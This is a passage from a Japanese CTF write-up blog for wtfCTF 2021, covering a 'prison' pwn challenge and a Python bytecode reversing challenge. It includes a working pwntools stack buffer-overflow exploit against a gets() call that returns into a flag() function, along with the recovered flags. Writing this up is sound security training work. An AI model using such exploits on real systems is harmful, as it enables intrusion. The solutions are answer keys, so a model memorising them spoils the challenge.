+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402050</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Where is this prison: &#34;</span><span class="p">);</span>
+<span class="hl">  <span class="n">gets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">);</span>
+</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">param_1</span> <span class="o">=</span> <span class="n">local_68</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_60</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_58</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_50</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_48</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_40</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_38</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">param_1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">param_1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>flag()関数も用意されています。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat flag.txt&#34;</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>checksecの出力結果。</p>
+<pre>
+$ checksec prison
+[*] '/home/captureamerica/OneDrive/CTF/wtfctf_2021/prison'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+<p><br /></p>
+<p>結局、build_prison()でBOFを起こしてflag()関数を呼ぶだけのことで、他の箇所は無視しても大丈夫です。</p>
+<p><br /></p>
+<p>オフセットは gdb で確認したところ、168バイトでした。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;20.42.99.115&#34;</span><span class="p">,</span> <span class="mi">3213</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./prison&#39;</span><span class="p">)</span>
+<span class="n">addr_flag</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">168</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_flag</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Where is this prison: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>実行結果：</p>
+<pre>
+$ ./prison_solve.py
+wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}
+</pre>
+<p><br /></p>
+<p>Flag: <code>wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}</code></p>
+<p><br /><br /></p>
+<h2 id="rev-h3ll0r3v-100-points">[Rev]: H3ll0R3v (100 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Hello bois!</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>Hello (python 3.8 byte-compiled)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>pycdc と pycdas を使って解きました。</p>
+<pre>
+$ pycdc Hello
+# Source Generated with Decompyle++
+# File: Hello (Python 3.8)
+
+
+def main(input):
+    j = -4
+    for c in input:
+        exit(43)
+    if j == -7:
+        if c != 'w':
+            exit(133)
+        elif j == -5:
+            if c != 'f':
+                exit(42069)
+            elif j == -4 and c != 'C':
+                exit(11037)
+            if j == 7 and c != 'R':
+                exit(9001)
+            elif j == -2 and c != 'F':
+                exit(11037)
+        if j == -1 and c != '{':
+            exit(11037)
+        if j == 4 and c != '3':
+            exit(11037)
+        if j == 0 and c != '3':
+            exit(11037)
+        elif j == -3 and c != 'T':
+            exit(82)
+    if j == 2 and c != '_':
+        exit(11037)
+    if j == -6 and c != 't':
+        exit(133)
+    if j == 6:
+        if c != 'E':
+            exit(133)
+        elif j == 9 and c != '3':
+            exit(7223)
+        elif j == 3 and c != 'R':
+            exit(133)
+        if j == 5 and c != 'V':
+            exit(133)
+        if j == 8:
+            if c != '5':
+                exit(6738)
+            elif j == 10 and c != '}':
+                exit(1111)
+    j += 1
+    continue
+    print('Hello World')
+</pre>
+<p>jが位置を示していて、そこに入る文字も見つかります。まとめると<code>wtfCTF{3 _R3VER53}</code> になり、一文字足りません。</p>
+<p><br />
+足りなかった<code>Z</code>は pycdas の出力結果で見つかりました。</p>
+<pre>
+$ pycdas Hello
+Hello (Python 3.8)
+[Code]
+    File Name: Hello.py
+    Object Name: <module>
+    Arg Count: 0
+    Pos Only Arg Count: 0
+    KW Only Arg Count: 0
+    Locals: 0
+    Stack Size: 2
+    Flags: 0x00000040 (CO_NOFREE)
+    [Names]
+        'main'
+    [Var Names]
+    [Free Vars]
+    [Cell Vars]
+    [Constants]
+        [Code]
+            File Name: Hello.py
+            Object Name: main
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Locals: 3
+            Stack Size: 3
+            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
+            [Names]
+                'exit'
+                'print'
+            [Var Names]
+                'input'
+                'j'
+                'c'
+            [Free Vars]
+            [Cell Vars]
+            [Constants]
+                None
+                -4
+                1
+                'Z'  <<
+                43
+                -7
+                'w'
+:
+(snip)
+:
+</pre>
+<p><br /></p>
+<p>Flag: <code>wtfCTF{3Z_R3VER53}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-06-06
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/dctf_2021/">
+            <span class="next-text nav-default">DCTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
